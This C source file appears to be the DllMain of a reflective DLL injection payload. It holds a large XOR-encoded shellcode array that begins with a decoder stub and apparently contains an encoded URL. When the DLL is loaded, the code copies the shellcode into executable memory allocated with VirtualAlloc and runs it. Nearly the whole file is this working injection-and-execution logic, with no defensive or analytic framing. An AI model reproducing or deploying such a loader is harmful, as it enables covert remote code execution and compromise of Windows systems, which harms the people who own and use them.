//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
	unsigned char buf[] =
		"\xeb\x27\x5b\x53\x5f\xb0\x66\xfc\xae\x75\xfd\x57\x59\x53\x5e"
		"\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\xd4\xbf"
		"\x74\x07\x80\x3e\x66\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff"
		"\xff\x06\x04\x66\xfa\x4c\x85\xe0\xf6\xec\xca\x04\x06\x04\x47"
		"\x55\x47\x54\x54\x55\x50\x4c\x37\xd6\x63\x4c\x8d\x56\x66\x4c"
		"\x8d\x56\x1e\x4c\x8d\x56\x26\x4c\x8d\x76\x56\x4c\x09\xb3\x4c"
		"\x4e\x4b\x35\xcf\x4c\x37\xc4\xaa\x38\x67\x78\x04\x28\x26\x45"
		"\xc7\xcd\x0b\x45\x07\xc5\xe4\xe9\x54\x45\x57\x4c\x8d\x56\x26"
		"\x8f\x44\x38\x4e\x05\xd6\x62\x87\x7c\x1e\x0f\x04\x0b\x83\x76"
		"\x06\x04\x06\x8f\x86\x8c\x06\x04\x06\x4c\x83\xc4\x72\x63\x4e"
		"\x05\xd6\x54\x8d\x4c\x1e\x40\x8d\x44\x26\x4d\x07\xd4\xe5\x52"
		"\x4e\xfb\xcf\x45\x8d\x30\x8e\x4c\x07\xd2\x4b\x35\xcf\x4c\x37"
		"\xc4\xaa\x45\xc7\xcd\x0b\x45\x07\xc5\x3e\xe4\x73\xf5\x4a\x07"
		"\x4a\x20\x0e\x41\x3f\xd5\x73\xdc\x5e\x40\x8d\x44\x22\x4d\x07"
		"\xd4\x60\x45\x8d\x08\x4e\x40\x8d\x44\x1a\x4d\x07\xd4\x47\x8f"
		"\x02\x8c\x4e\x05\xd6\x45\x5e\x45\x5e\x5a\x5f\x5e\x47\x5c\x47"
		"\x5d\x47\x5e\x4e\x87\xea\x24\x47\x56\xf9\xe4\x5e\x45\x5f\x5e"
		"\x4e\x8f\x14\xed\x4d\xfb\xf9\xfb\x5b\x4c\x37\xdf\x55\x4d\xb8"
		"\x73\x6f\x6a\x6f\x6a\x63\x70\x06\x45\x50\x4c\x8f\xe5\x4f\xc3"
		"\xc4\x48\x71\x22\x01\xfb\xd3\x57\x55\x4c\x8f\xe5\x55\x5e\x4b"
		"\x35\xc6\x49\x37\xcd\x55\x57\x4f\xbe\x3c\x52\x7f\xa3\x06\x04"
		"\x06\x04\xf9\xd1\xee\x0c\x06\x04\x06\x35\x28\x35\x28\x35\x28"
		"\x35\x06\x5e\x4e\x8d\xc7\x4d\xc1\xc4\xbd\x05\x06\x04\x4b\x35"
		"\xcf\x57\x55\x6e\x05\x57\x4f\xbe\x51\x8d\x99\xc2\x06\x04\x06"
		"\x04\xf9\xd1\xee\x9c\x06\x04\x06\x2b\x6f\x6a\x62\x61\x7e\x2b"
		"\x30\x30\x29\x36\x67\x43\x6e\x53\x68\x7d\x6b\x72\x71\x51\x70"
		"\x6b\x55\x32\x6c\x67\x62\x75\x6f\x4e\x71\x47\x4f\x63\x62\x47"
		"\x47\x37\x65\x5d\x6c\x5b\x4d\x54\x52\x47\x32\x6e\x5e\x6d\x72"
		"\x53\x48\x53\x45\x67\x4f\x35\x5e\x37\x40\x46\x6c\x6a\x2b\x30"
		"\x50\x55\x47\x53\x47\x33\x41\x73\x4f\x63\x72\x30\x76\x51\x40"
		"\x6f\x33\x68\x72\x73\x43\x6b\x75\x46\x40\x34\x74\x48\x2b\x30"
		"\x47\x34\x65\x4c\x5e\x7c\x75\x67\x68\x35\x4d\x42\x43\x53\x4c"
		"\x34\x73\x50\x30\x55\x74\x69\x36\x6b\x51\x7e\x69\x7e\x6a\x37"
		"\x48\x3c\x43\x4f\x45\x47\x5f\x46\x70\x67\x56\x55\x6c\x6e\x30"
		"\x71\x49\x48\x42\x5b\x6a\x60\x6a\x49\x06\x4c\x8f\xc5\x55\x5e"
		"\x47\x5c\x4b\x35\xcf\x57\x4e\xbc\x06\x36\xa6\x80\x06\x04\x06"
		"\x04\x56\x57\x55\x4d\xc1\xc6\xed\x51\x28\x3f\xf9\xd1\x4e\x8d"
		"\xc0\x6e\x0c\x5b\x4e\x8d\xf7\x6e\x19\x5e\x54\x6c\x86\x37\x06"
		"\x04\x4f\x8d\xe6\x6e\x02\x45\x5f\x4d\xbc\x71\x40\x9a\x80\x04"
		"\x06\x04\x06\xfb\xd3\x49\x37\xc4\x55\x5e\x4e\x8d\xf7\x49\x37"
		"\xcd\x4b\x35\xcf\x57\x55\x4d\xc1\xc6\x2b\x02\x1e\x7f\xf9\xd1"
		"\x83\xc4\x73\x1b\x4e\xc3\xc7\x8c\x15\x04\x06\x4d\xbc\x40\xf6"
		"\x31\xe6\x04\x06\x04\x06\xfb\xd3\x4c\xf9\xcb\x72\x06\xed\xae"
		"\xee\x51\x06\x04\x06\x57\x5f\x6e\x46\x5e\x4f\x8d\xd7\xc5\xe4"
		"\x14\x4f\xc3\xc6\x04\x16\x04\x06\x4d\xbc\x5c\xa2\x57\xe3\x04"
		"\x06\x04\x06\xfb\xd3\x4c\x95\x57\x55\x4c\x8f\xe3\x4e\x8d\xf7"
		"\x4c\x8f\xde\x4f\xc3\xc6\x04\x26\x04\x06\x4d\x8f\xfd\x4f\xbe"
		"\x14\x92\x8f\xe6\x06\x04\x06\x04\xf9\xd1\x4e\x87\xc2\x24\x83"
		"\xc4\x72\xb6\x60\x8f\x01\x4c\x07\xc7\x83\xc4\x73\xd6\x5e\xc7"
		"\x5e\x6e\x06\x5d\xbd\xe4\x1b\x2e\x0c\x45\x8f\xde\xf9\xd1\xd4"
		"\xbf";

    BOOL bReturnValue = TRUE;
	LPVOID lpPayload;

	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			lpPayload = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			memcpy(lpPayload, buf, sizeof(buf));
			((void(*)()) lpPayload)();
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}